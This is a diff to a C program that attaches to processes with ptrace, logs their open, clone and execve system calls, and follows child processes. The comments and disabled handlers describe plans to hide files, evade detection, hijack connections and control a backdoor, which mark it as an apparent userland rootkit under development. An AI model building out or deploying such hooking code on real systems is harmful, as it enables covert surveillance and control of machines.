@@ -31,6 +31,7 @@
 #include <linux/types.h>
 #include <sys/reg.h> //i hate this file
 #include <sys/user.h>
+#include <sys/procfs.h>
 #include <unistd.h>
 #include <sys/syscall.h>
 #include <stdio.h>
@@ -196,26 +197,51 @@ int syscall_open(int pid, struct user_regs_struct regs) {
 	}
 }
 
-int syscall_fork(int pid, struct user_regs_struct regs) {
+// This is clone..
+pid_t syscall_fork(int pid, struct user_regs_struct regs) {
     static in_syscall;
     
     if(in_syscall == 0) {
 	in_syscall = 1;
-	printf("entering fork()\n");
+	printf("entering fork/clone()\n");
     }
     else { //exit call
 	in_syscall = 0;
 	printf("FORK()'s return pid: %d\n", regs.eax);
+	return(regs.eax);
     }
 
+}
+
+int syscall_execve(int pid, struct user_regs_struct regs) {
+    static in_syscall;
+    long path_addr;
+    char *path= (char *)malloc(1000);
+    //entering the system call
+    if(in_syscall == 0) {
+	path_addr=ptrace(PTRACE_PEEKUSER, pid, EBX*4, 0);
+	p_getstr(pid, path, path_addr);
+	printf("caught execve(\"%s\")\n", path);
+	free(path);
+	in_syscall = 1;
+    }
+    else {
+	in_syscall = 0;
+    }
+    
 }
 
 /**************************End of syscall handlers*********************/
 
 int hookem(int pid) {
+	if(pid == 0 || pid == 22) return;
+	printf("Starting hookem() on pid %d\n", pid);
 	int w;
+	pid_t ret=0;
 	struct user_regs_struct regz;
-/*	long arg;
+
+/*	
+	long arg;
 	int procfd;
 	char procpath[MAXPATHLEN];
 
@@ -226,6 +252,7 @@ int hookem(int pid) {
 	arg=PR_FORK;
 	ioctl(procfd, PIOCSET, &arg); // thank you strace
 */	
+	
 	if(ptrace(PTRACE_ATTACH, pid, (char *) 1, NULL) != 0) { printf ("ptrace() phailed and so did you\n"); exit(-1); }
 	
 	/* the syscall taker loop */
@@ -238,13 +265,18 @@ int hookem(int pid) {
 			case __NR_open: syscall_open(pid,regz); break; // various
 //			case __NR_getdents64: syscall_getdents64(pid,regz); break; // HIDE :D
 			// case __NR_fork: syscall_fork(pid,regz); break; // to follow procs -- this needs to be clone()
-			case __NR_clone: syscall_fork(pid,regz); break; // clone <-> fork
+			case __NR_clone: 
+			    ret=syscall_fork(pid,regz);
+			    printf("attempting to follow after pid: %d\n", ret);
+			    ptrace(PTRACE_DETACH, pid, NULL, 0);
+			    hookem(ret); 
+			    break; // clone <-> fork
 //			case __NR_unlink: syscall_unlink(pid,regz); break; // protection
 //			case __NR_kill: syscall_kill(pid,regz); break; // protection
 //			case __NR_read: syscall_read(pid,regz); break; // various
 //			case __NR_write: syscall_write(pid,regz); break; // various
 //			case __NR_init_module: syscall_init_module(pid,regz); break; // to hijack/evasion
-//			case __NR_execve: syscall_execve(pid,regz); break; // to monitor/evasion
+			case __NR_execve: syscall_execve(pid,regz); break; // to monitor/evasion
 //			case __NR_bind: syscall_bind(pid,regz); break; // to hijack connections/monitor
 //			case __NR_accept: syscall_accept(pid,regz); break; // to hijack connections
 //			case __NR_ioctl: syscall_ioctl(pid,regz); break; // to control backdoor
